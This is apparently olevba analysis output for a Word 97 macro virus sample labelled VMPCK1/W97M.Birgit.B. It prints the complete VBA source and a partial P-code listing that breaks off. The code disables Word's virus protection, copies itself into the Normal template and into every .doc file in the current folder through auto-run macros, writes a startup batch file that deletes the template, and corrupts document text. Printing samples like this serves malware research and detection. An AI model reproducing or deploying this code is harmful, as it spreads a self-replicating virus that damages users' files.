olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.dm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.dm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ariel.bas 
in file: Virus.MSWord.VMPCK1.dm - OLE stream: 'Macros/VBA/Ariel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Ariel()
    
On Error Resume Next

Randomize

If Month(Now()) = 1 And Day(Now()) = 24 Then
    MsgBox ("Say HAPPY BIRTHDAY TO SHANKAR")
    
End If

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.SavePropertiesPrompt = False
Options.ConfirmConversions = False

Application.VBE.ActiveVBProject.VBComponents("Ariel").Export "c:\Ariel.sys"
ActiveDocument.ReadOnlyRecommended = False
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Not infected", vbSystemModal
f16935 = u5803 & c7210 & Int(Rnd * 1509)
f9377 = u14754 & c17776 & k15060 & m14754
If Day(Now()) = 19 Then Call p4788
If Month(Now()) = 3 And Day(Now()) = 19 Then MsgBox "BIRGIT FOREVER", vbInformation, "Birthday Greeting!!!"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Doctor Rave"
    .Title = "W97M.Birgit.B"
    .Subject = "Birgit"
    .Comments = "You're infected with the W97M.Birgit.B Virus !!!"
    .Execute
End With
 f8250$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f8162 = u12951 & c2030 & Int(Rnd * 3893)
i47887995 = GetAttr(NormalTemplate.FullName)
If i47887995 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8250$)
If i47887995 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8250$)
If i47887995 = vbReadOnly Then GoTo fuckoff
If i47887995 = vbReadOnly + vbArchive Then GoTo fuckoff
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Ariel" Then Unit187799563813 = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Ariel" Then o0o63819 = True
Next I
If Unit187799563813 = True And o0o63819 = False Then Set p638179959 = NormalTemplate.VBProject.VBComponents
If Unit187799563813 = False And o0o63819 = True Then Set p638179959 = ActiveDocument.VBProject.VBComponents
p638179959.import "c:\Ariel.sys"
If Unit187799563813 = True And o0o63819 = False Then Shell ("label c: Infected"), 0
If Unit187799563813 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If o0o63819 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
            Call dhIconDisco("C:\autorun.inf")
'VMPCK v1.0c [SR-1 Compatable]
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "Infected", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call Ariel
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Ariel
End Sub
Sub FileClose()
    On Error Resume Next
    Call Ariel
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
f11162 = u7698 & c11555 & Int(Rnd * 3728)
Dialogs(wdDialogToolsOptions).Show
k2187 = m16884 & e13658
    Call Ariel
End Sub
Sub FileExit()
    On Error Resume Next
f7757 = u19016 & c6779 & k9310 & m19016
    Call Ariel
f9543 = u11958 & c10557 & Int(Rnd * 7751)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Ariel
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Ariel
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
f12150 = u8114 & c13905 & Int(Rnd * 3994)
    Call Ariel
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Ariel
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Ariel
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Ariel
End If
Loop
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Ariel
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Ariel
MsgBox "Word Basic Err =7"
k18504 = m6653 & e14048
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Ariel
MsgBox "Word Basic Err =7"
End Sub
Sub ViewVBCode()
    On Error Resume Next
k18160 = m7554 & e2873
    Call Ariel
MsgBox "Word Basic Err =7"
End Sub
Sub p4788()
    On Error Resume Next
f8967 = u3474 & c7903 & k6843 & m3474
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "il"
            .Replacement.Text = "li"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f9133 = u10677 & c10684 & Int(Rnd * 4163)
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
f6526 = u14521 & c17335 & Int(Rnd * 7920)
snag1$ = "c:\progra~1\micros~2\templa~1\"
f14501 = u14848 & c11089 & Int(Rnd * 8258)
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
f18727 = u16742 & c5435 & Int(Rnd * 8926)
Choice = Int(Rnd * 2)
k8534 = m12807 & e9975
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
f10751 = u6416 & c1682 & Int(Rnd * 140)
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.VMPCK1.dm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Ariel - 12119 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Sub Ariel())
' Line #5:
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	ArgsCall Read 0x0000 
' Line #9:
' Line #10:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #11:
' 	LitStr 0x001D "Say HAPPY BIRTHDAY TO SHANKAR"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #12:
' Line #13:
' 	EndIfBlock 
' Line #14:
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #19:
' Line #20:
' 	LitStr 0x000C "c:\Ariel.sys"
' 	LitStr 0x0005 "Ariel"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #22:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St rm 
' Line #23:
' 	Ld rm 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Not infected"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #24:
' 	Ld u5803 
' 	Ld c7210 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x05E5 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f16935 
' Line #25:
' 	Ld u14754 
' 	Ld c17776 
' 	Concat 
' 	Ld k15060 
' 	Concat 
' 	Ld m14754 
' 	Concat 
' 	St f9377 
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) p4788 0x0000 
' 	EndIf 
' Line #27:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "BIRGIT FOREVER"
' 	Ld vbInformation 
' 	LitStr 0x0014 "Birthday Greeting!!!"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #28:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #29:
' 	LitStr 0x000B "Doctor Rave"
' 	MemStWith Author 
' Line #30:
' 	LitStr 0x000D "W97M.Birgit.B"
' 	MemStWith Title 
' Line #31:
' 	LitStr 0x0006 "Birgit"
' 	MemStWith Subject 
' Line #32:
' 	LitStr 0x0030 "You're infected with the W97M.Birgit.B Virus !!!"
' 	MemStWith Comments 
' Line #33:
' 	ArgsMemCallWith Execute 0x0000 
' Line #34:
' 	EndWith 
' Line #35:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St f8250$ 
' Line #36:
' 	Ld u12951 
' 	Ld c2030 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0F35 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f8162 
' Line #37:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St i47887995 
' Line #38:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f8250$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #39:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f8250$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #40:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #41:
' 	Ld i47887995 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #42:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #43:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Ariel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Unit187799563813 
' 	EndIf 
' Line #44:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #46:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Ariel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St o0o63819 
' 	EndIf 
' Line #47:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld Unit187799563813 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld o0o63819 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set p638179959 
' 	EndIf 
' Line #49:
' 	Ld Unit187799563813 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld o0o63819 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set p638179959 
' 	EndIf 
' Line #50:
' 	LitStr 0x000C "c:\Ariel.sys"
' 	Ld p638179959 
' 	ArgsMemCall import 0x0001 
' Line #51:
' 	Ld Unit187799563813 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld o0o63819 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "label c: Infected"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' 	EndIf 
' Line #52:
' 	Ld Unit187799563813 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #53:
' 	Ld o0o63819 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #54:
' 	LitStr 0x000E "C:\autorun.inf"
' 	ArgsCall (Call) dhIconDisco 0x0001 
' Line #55:
' 	QuoteRem 0x0000 0x001D "VMPCK v1.0c [SR-1 Compatable]"
' Line #56:
' 	Label fuckoff 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub HelpAbout())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitStr 0x0008 "Infected"
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub FileNew())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #65:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #66:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #67:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub FileClose())
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #72:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #73:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub ToolsOptions())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	Ld u7698 
' 	Ld c11555 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0E90 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f11162 
' Line #78:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #79:
' 	Ld m16884 
' 	Ld e13658 
' 	Concat 
' 	St k2187 
' Line #80:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub FileExit())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	Ld u19016 
' 	Ld c6779 
' 	Concat 
' 	Ld k9310 
' 	Concat 
' 	Ld m19016 
' 	Concat 
' 	St f7757 
' Line #85:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #86:
' 	Ld u11958 
' 	Ld c10557 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1E47 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f9543 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #88:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #89:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #90:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #91:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #92:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #93:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #94:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #95:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #96:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #97:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #98:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #99:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Loop 
' Line #102:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub AutoOpen())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	Ld u8114 
' 	Ld c13905 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0F9A 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f12150 
' Line #107:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub AutoExit())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #112:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #113:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #114:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #115:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #116:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #117:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #118:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #119:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #120:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #121:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #122:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #123:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	Loop 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub AutoClose())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub ToolsMacro())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #134:
' 	LitStr 0x0011 "Word Basic Err =7"
' 	ArgsCall MsgBox 0x0001 
' Line #135:
' 	Ld m6653 
' 	Ld e14048 
' 	Concat 
' 	St k18504 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub FileTemplates())
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #140:
' 	LitStr 0x0011 "Word Basic Err =7"
' 	ArgsCall MsgBox 0x0001 
' Line #141:
' 	EndSub 
' Line #142:
' 	FuncDefn (Sub ViewVBCode())
' Line #143:
' 	OnError (Resume Next) 
' Line #144:
' 	Ld m7554 
' 	Ld e2873 
' 	Concat 
' 	St k18160 
' Line #145:
' 	ArgsCall (Call) Ariel 0x0000 
' Line #146:
' 	LitStr 0x0011 "Word Basic Err =7"
' 	ArgsCall MsgBox 0x0001 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub p4788())
' Line #149:
' 	OnError (Resume Next) 
' Line #150:
' 	Ld u3474 
' 	Ld c7903 
' 	Concat 
' 	Ld k6843 
' 	Concat 
' 	Ld m3474 
' 	Concat 
' 	St f8967 
' Line #151:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #152:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #153:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #154:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #155:
' 	LitStr 0x0002 "il"
' 	MemStWith Then 
' Line #156:
' 	LitStr 0x0002 "li"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #157:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #158:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #159:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #160:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #161:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #162:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #163:
' 	EndWith 
' Line #164:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #165:
' 	Ld u10677 
' 	Ld c10684 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1043 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f9133 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub vBitchES(strFile As String))
' Line #169:
' Line #170:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #171:
' 	OnError (Resume Next) 
' Line #172:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #173:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #174:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #175:
' 	Ld u14521 
' 	Ld c17335 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1EF0 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f6526 
' Line #176:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #177:
' 	Ld u14848 
' 	Ld c11089 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x2042 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f14501 
' Line #178:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #179:
' 	Ld Friend 
' 	St hFile 
' Line #180:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #181:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #182:
' 	Ld hFile 
' 	Sharp 
